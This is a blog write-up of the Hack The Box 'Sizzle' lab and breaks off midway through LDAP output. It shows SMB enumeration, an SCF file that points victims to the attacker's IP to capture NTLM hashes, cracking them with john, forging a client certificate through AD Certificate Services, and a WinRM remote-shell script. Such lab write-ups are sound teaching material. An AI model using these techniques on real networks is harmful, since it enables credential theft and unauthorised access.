---
layout: article
title: Hack the Box - Sizzle
permalink: /ctfs/htb-sizzle
key: page-aside
aside:
  toc: true
---

Quick write-up of Hack The Box: Sizzle

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>


## Enumeration


We start off with an aggressive nmap scan of all ports. Doing so reveals ports commonly seen on a Domain Controller running Active Directory (DNS on 53, Kerberos on 88, LDAP on 389 and 636 and WinRM on 5985 and 5986).

<img src="/assets/images/ctfs/htb-irked/nmap.png" alt="" class="center" alt="" class="center">

```bash
root@kali:~/htb/sizzle# nmap -A 10.10.10.103 -p- -oN nmap-10.10.10.103
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-06 23:47 EDT
Nmap scan report for 10.10.10.103
Host is up (0.24s latency).
Not shown: 65506 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-07T03:51:32+00:00; -5m57s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-07T03:51:32+00:00; -5m56s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-07T03:51:31+00:00; -5m57s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-07T03:51:34+00:00; -5m57s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-07T03:51:27+00:00; -5m57s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-06-07T03:28:31
|_Not valid after:  2020-06-06T03:28:31
|_ssl-date: 2019-06-07T03:51:30+00:00; -5m57s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
63628/tcp open  msrpc         Microsoft Windows RPC
63641/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=6/6%Time=5CF9E011%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m56s, deviation: 0s, median: -5m57s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-06-06 23:51:28
|_  start_date: 2019-06-06 23:37:29

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   58.81 ms  10.10.14.1
2   263.31 ms 10.10.10.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 620.77 seconds

```

We can use <b>smbclient</b> to check if we have access to any of the shares on the system.

```bash
root@kali:~# smbclient -N -L //10.10.10.103

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    CertEnroll      Disk      Active Directory Certificate Services share
    Department Shares Disk      
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    Operations      Disk      
    SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

```

We find that we have access to an interesing share called "Department Shares." Unforunately, we don't have access to Operations. We can mount "Department Shares" using the command below.

```bash
root@kali:~# smbclient -N //10.10.10.103/Operations
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
root@kali:~# smbclient -N //10.10.10.103/"Department Shares"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

        7779839 blocks of size 4096. 2498567 blocks available
smb: \> exit

root@kali:/tmp# mount -t cifs //10.10.10.103/"Department Shares" /mnt
Password for root@//10.10.10.103/Department Shares:  
root@kali:/tmp# cd /mnt
root@kali:/mnt# ls -la
total 64
drwxr-xr-x  2 root root 24576 Jul  3  2018  .
drwxr-xr-x 19 root root 36864 May 31 00:14  ..
drwxr-xr-x  2 root root     0 Jul  2  2018  Accounting
drwxr-xr-x  2 root root     0 Jul  2  2018  Audit
drwxr-xr-x  2 root root     0 Jul  3  2018  Banking
drwxr-xr-x  2 root root     0 Jul  2  2018  CEO_protected
drwxr-xr-x  2 root root     0 Jul  2  2018  Devops
drwxr-xr-x  2 root root     0 Jul  2  2018  Finance
drwxr-xr-x  2 root root     0 Jul  2  2018  HR
drwxr-xr-x  2 root root     0 Jul  2  2018  Infosec
drwxr-xr-x  2 root root     0 Jul  2  2018  Infrastructure
drwxr-xr-x  2 root root     0 Jul  2  2018  IT
drwxr-xr-x  2 root root     0 Jul  2  2018  Legal
drwxr-xr-x  2 root root     0 Jul  2  2018 'M&A'
drwxr-xr-x  2 root root     0 Jul  2  2018  Marketing
drwxr-xr-x  2 root root     0 Jul  2  2018 'R&D'
drwxr-xr-x  2 root root     0 Jul  2  2018  Sales
drwxr-xr-x  2 root root     0 Jul  2  2018  Security
drwxr-xr-x  2 root root     0 Jul  2  2018  Tax
drwxr-xr-x  2 root root     0 Jul 10  2018  Users
drwxr-xr-x  2 root root     0 Jul  2  2018  ZZ_ARCHIVE

```
Using <b>smbcacls</b>, we see that we have full permissions for the <b>Users/Public</b> directory.

```bash
root@kali:/mnt# smbcacls -N //10.10.10.103/"Department Shares" Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL

```

## User Shell

There is a known hash-stealing technique that uses a Shell Command Files (SCF) to capture NTLM hashes from users that browse to a share an attacker can specify. The attacker can intercept the hashed password and attempt to crack it locally. A more detailed explanation is provided at <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" target="_blank">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a>.

We first create an SCF file and copy it to the folder most likely folder to be visited.

```bash
root@kali:~/htb/sizzle# cat sizzle.scf
[Shell]
Command=2
IconFile=\\10.10.14.16\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
In this case, it would make sense to transfer the file to the Public share. We can then set up <b>responder</b> to listen for a connection. Not too long after, we receive hashed credentials for user <b>amanda</b>.

```bash
root@kali:/mnt/Users# ls
amanda      bill  chris  joe   lkys37en  mrb3n
amanda_adm  bob   henry  jose  morgan    Public
root@kali:/mnt/Users# cd Public
root@kali:/mnt/Users/Public# cp /root/htb/sizzle/sizzle.scf .

root@kali:/mnt/Users/Public# responder -I tun0
...
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
[SMBv2] NTLMv2-SSP Username : HTB\amanda
[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:8bf3e5b5758b3fa9:78394174424806E97BE1A50F4D570412:0101000000000000C0653150DE09D201466E92E295FCC727000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000009AAC37329245F4BE3D26D480B7BA05807D5788D7FDDB72BE9EA0F61FF45EEDC80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003600000000000000000000000000

```

We can then use <b>john</b> to attempt to crack the NTLMv2 hash if hashcat isn't available on your VM.

```bash
root@kali:~/htb/sizzle# john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:04 DONE (2019-06-08 01:46) 0.2222g/s 2537Kp/s 2537Kc/s 2537KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

With credentials, we can take advantage of Windows Remote Management as indicated by the open ports 5985 and 5986. There is a Ruby script that gives a PowerShell shell which can be found at <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell_with_upload.rb" target="_blank">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell_with_upload.rb</a>. We modify the script to allow us to authenticate with credentials. Note, we have to use port 5986/ssl for winrm. 

```bash
root@kali:~/htb/sizzle# cat winrm.rb 
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt

conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  user: 'htb\amanda',
  password: 'Ashare1972',
  :no_ssl_peer_verification => true
)

file_manager = WinRM::FS::FileManager.new(conn) 


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end

        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end    
    puts("Exiting with code #{output.exitcode}")
end

```

If we attempt to run the script right away, we will get an error. Eventually, we will discover that we need to utilize the credentials (amanda:Ashare1972) to access Active Directory Certificate Services on 10.10.10.103/certsrv, discoverable with a <b>gobuster</b> scan. We can generate a valid certificate with <b>openssl</b> that we can use to authenticate with the server. So, the credentials we thought would work for WinRM will instead be used to authenticate to <b>/certsrv</b> where we can generate a valid certificate. Using the certificate, we can hopefully authenticate to WinRM and get our Powershell shell.

```bash
root@kali:~/htb/sizzle# gobuster -u 10.10.10.103 -w /usr/share/dirb/wordlists/common.txt -s '200,204,301,302,307,401,403,500'

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.103/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/common.txt
[+] Status codes : 200,204,301,302,307,401,403,500
[+] Timeout      : 10s
=====================================================
2019/06/08 16:50:30 Starting gobuster
=====================================================
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/certsrv (Status: 401)
/images (Status: 301)
/Images (Status: 301)
/index.html (Status: 200)
=====================================================
2019/06/08 16:51:01 Finished
=====================================================
```

<img src="/assets/images/ctfs/htb-sizzle/adcs.png" alt="" class="center" alt="" class="center">

Below are the commands we use to generate a private key and certificate signing request.

```bash
root@kali:~/htb/sizzle# openssl genrsa -aes256 -out sizzle.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
..+++++
.............................+++++
e is 65537 (0x010001)
Enter pass phrase for sizzle.key:
Verifying - Enter pass phrase for sizzle.key:
root@kali:~/htb/sizzle# openssl req -new -key sizzle.key -out sizzle.csr
Enter pass phrase for sizzle.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

root@kali:~/htb/sizzle# cat sizzle.csr
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBALBpPKVLVpNavL6tgzswYS9K30ydAZLEc0LFLnJR
ictAXnRWAjMEXEwKe2NxCW0XOO0cwE3Acd7xGgBJBkwBkZZkRpwTU8DpbFeb6QRQ
Qk9+v3ieGip7D7BFtDfwZG19GqaI5UBUzX+a9jyDQSmiDCLl9q3izCnFem7ZMVKd
7TqtBh2OLWejF182H9X83NDFsbMtQDEa7YxfrSChQa5dI02NoHREvBTyq8/v3zNx
CiqLMUZWvoYyjra1LUMSspuBUOBUuuCDh+dEO4BPDmXPs78PmhBgVDCmuYhcbWEL
vEkRIPyMohKYZ07p7BTw46A0PhER0pbGaI0VsoKS+ECWXXUCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQAlIR6WWSTEwiHi+H+232Ra7DhjEfmbRhnYTAdbxAZ2i2FR
qKprYKGgFxzKqR+1G0XdzxfnFipVreZRPYYg4x0o2RtbjmD/HAxJkZ5UHLNjniYn
GCIzPGhC2CTYj5o5yyjNaGLedc500o7VfF1P7aCxSeFOtKnxH4JhRzfmZgZWvj+s
4IDSXw3AyK3o2ebu9CoFG7ozv07PitdDVb161DPTTXVSCyBPWwzNbnxt5pQFHWV4
MAv0qDmnVJMG4sVRk8QwN+0KPmBueNp1FVJFSa3W3dIOqFQZTtwMjsCUaPu1IgU7
t0AxWplM0ri8LSW6Sjpz8pVlbzwp82uBAaNeYn2g
-----END CERTIFICATE REQUEST-----
```


Back on <b>/certsrv</b>, we click on "Request a certificate" and then on "advanced certificate request". We then paste our csr into the box and click "Submit". We can then download our certificate in Base64.

<img src="/assets/images/ctfs/htb-sizzle/download-cert.png" alt="" class="center" alt="" class="center">

Here, we're simply checking the details of the certificate that we downloaded.

<img src="/assets/images/ctfs/htb-sizzle/cert.png" alt="" class="center" alt="" class="center">

We can then delete the <b>user</b> and <b>password</b> fields in the winrm script and replace them with client_cert and client_key fields.

```bash
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt

conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  :client_cert => 'sizzle.cer',
  :client_key => 'sizzle.key',
  :no_ssl_peer_verification => true
)
...
```

Now, if we run the winrm script, we should have a shell.

```bash
root@kali:~/htb/sizzle# ruby winrm.rb
Enter PEM pass phrase:
PS htb\amanda@SIZZLE Documents> whoami
Enter PEM pass phrase:
htb\amanda
PS htb\amanda@SIZZLE Documents>
```

On our attacking machine, we can perform an LDAP query to search for administrative users.

```bash
root@kali:~# ldapsearch -x -h 10.10.10.103 -D "amanda@htb.local" -w "Ashare1972" -b "dc=htb,dc=local"
```

A more fine-grained search would look like the following. We can deduce that the administrative users are Administrator and sizzler.

```bash
root@kali:~# ldapsearch -x -h 10.10.10.103 -D "amanda@htb.local" -w "Ashare1972" -b "dc=htb,dc=local" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))
# requesting: ALL
#

# Administrator, Users, HTB.LOCAL
dn: CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
userCertificate:: MIIGIDCCBQigAwIBAgITaQAAABBVoOMMg4FkEgAAAAAAEDANBgkqhkiG9w0B
 AQsFADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxFjAUBgNVB
 AMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzEyMDQyOTUyWhcNMjAwNzExMDQyOTUyWjBUMRUwEwYKCZ
 ImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxDjAMBgNVBAMTBVVzZXJzMRYwFAY
 DVQQDEw1BZG1pbmlzdHJhdG9yMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtpnjjaFQ
 DciJZWQs2rVw3tyAvzrKyCihKD62hOGymXkoR7TYhoIm3eCs88rRg9+CHsRnR4Vpj9oqpxgRQKR66
 c/Hpd8Bqjd4db9Zk/qN93y38JcyfMKSkWNMLrJne9cw+uVjuzobWI1Jftz1HKrQA1Hep2qjr5YNKa
 ziAG3zdxpqS6Ozc4FuS7pBJ1Wy/deNeHe2QCTk/NOhpW5vKqTvQLU4ksncvM+fmy4mnYc3eqhvcbt
 BCzMCR7/g6cgOwrGgNV+VQz5y29h5X1mAQ5XNDrubCt829elKbCcXd3Kit9+f9bnMxYcj2rXwEPYx
 r5Ayge6BFERFo2hOBZSKGS0JZQIDAQABo4IC+TCCAvUwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCN
 xUI5pJfgvm/E4epnz7ahB+Br/MJgWCHhds/hdGAagIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAg
 YIKwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgY
 IKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
 SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEF
 Hi8b9deKbmlekl/+RWB/b5dV0vrMB8GA1UdIwQYMBaAFEAG5FSzN5i8Ii4OGTYKGKCx3guKMIHIBg
 NVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPUhUQi1TSVpaTEUtQ0EsQ049c2l6emxlLEN
 OPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0
 aW9uLERDPUhUQixEQz1MT0NBTD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q
 2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAo
 aBnWxkYXA6Ly8vQ049SFRCLVNJWlpMRS1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vydml
 jZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1IVEIsREM9TE9DQUw/Y0FDZXJ0aWZp
 Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMgYDVR0RBCswKaAnB
 gorBgEEAYI3FAIDoBkMF0FkbWluaXN0cmF0b3JASFRCLkxPQ0FMMA0GCSqGSIb3DQEBCwUAA4IBAQ
 ClKiN1L6Z77fLDs8/6w8u3kmTbMvO1D1IcTIOOCypYmlPPET27fFYUVi2E+uQuGJ8eceVefvAmj2h
 wjSj51Bx+tqs5RadRrstxU+7kakG/TAp+au7fh4r6kYwXQvRV5MBapfRY06QNIZiykSIJAFClfuTl
 7p2DSrgRJMcPBCAl+vJC7xsUZoq16STNlc2E1AKYfz87cvrOLA6EGprqsiKdjkv7x5Q/TCL1CLHVq
 tac2frdrg9ga0pO6exay+xcm5nlBenP3SGoo4THjuX05zC4u3gql1J+z0ENftmvDyI6aGYYMHI/5a
 ChVpaYvyLGdcAyxZ01oPGu2lvCWmc1pPmG
userCertificate:: MIIGIDCCBQigAwIBAgITaQAAAA8NgpZoaTKpqAAAAAAADzANBgkqhkiG9w0B
 AQsFADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxFjAUBgNVB
 AMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzEyMDQyMzUyWhcNMjAwNzExMDQyMzUyWjBUMRUwEwYKCZ
 ImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxDjAMBgNVBAMTBVVzZXJzMRYwFAY
 DVQQDEw1BZG1pbmlzdHJhdG9yMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx8a0a4Y3
 VFLBYw5UNb4GUqJqN5ZPl1SA68kDgkq3B9XPk71GsGtchjIpYro4+JUx0GWA4zMBVai2u5IoSiJgi
 u5iHWSHMfu92Z6MROgxqYkvPW+ZW0DA5wphvhqVn3kwCwC9LIJAWw3pTz5q2bBJ5ov4Sgrd3GjqT7
 /QAxPKk/pG5j3hd4s0DbT1rbrlTiyMvny/IrGahby0WE4Xo3AyIh2gWFe1chF9CzYQVIdqZZ+Dh5z
 fu9ccA8KnOvp+fI1Pz70aftIvXj5FznjYgsjlsXVnftYhb1hOO09+IKGFdKg+l079EoXHKOxvEAKs
 vnAC9Goe68HWc7EOIgbF/MS/dQIDAQABo4IC+TCCAvUwPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCN
 xUI5pJfgvm/E4epnz7ahB+Br/MJgWCHhds/hdGAagIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAg
 YIKwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgY
 IKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
 SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEF
 Cu+yegLVv/cCDMogZ24zn2HS9wAMB8GA1UdIwQYMBaAFEAG5FSzN5i8Ii4OGTYKGKCx3guKMIHIBg
 NVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPUhUQi1TSVpaTEUtQ0EsQ049c2l6emxlLEN
 OPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0
 aW9uLERDPUhUQixEQz1MT0NBTD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q
 2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAo
 aBnWxkYXA6Ly8vQ049SFRCLVNJWlpMRS1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vydml
 jZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1IVEIsREM9TE9DQUw/Y0FDZXJ0aWZp
 Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMgYDVR0RBCswKaAnB
 gorBgEEAYI3FAIDoBkMF0FkbWluaXN0cmF0b3JASFRCLkxPQ0FMMA0GCSqGSIb3DQEBCwUAA4IBAQ
 Cm1V9mTSKTk1m23rHhWRvPWTZffFJPxp/wAwFlyykMlbcoL1I48G+v6DdLWKzdq/fGBF7OpSjhlM/
 e278HuaDHfOoK3VeLiS/H41V9mjuqaBq1y4jd1iieZeJCmQl9Ew2LKaKJbUHSDRVrRMVSokwFH1zh
 geFJppH5sO5bCnJXf2z1if5FwCN0+ey1OURTp85arr/XBuZCMNDXwi9UV4+5Gw/BUn/RWk+iSs4fz
 dOwhXA/wpgS8Pj6WkNCmHVUylwNxbm9sf0ZTvAszX+3OZh9VXRXyA2dmmrfDKg6zaMCUyiFjKuKIm
 doRJQuK6ivKMfPrDl61iQUSqcVcAMLq2ZN
userCertificate:: MIIFxDCCBKygAwIBAgITaQAAAAQXumlgEtAf3gAAAAAABDANBgkqhkiG9w0B
 AQsFADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxFjAUBgNVB
 AMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMDI1ODUxWhcNMTkwNzAzMDI1ODUxWjBUMRUwEwYKCZ
 ImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIxDjAMBgNVBAMTBVVzZXJzMRYwFAY
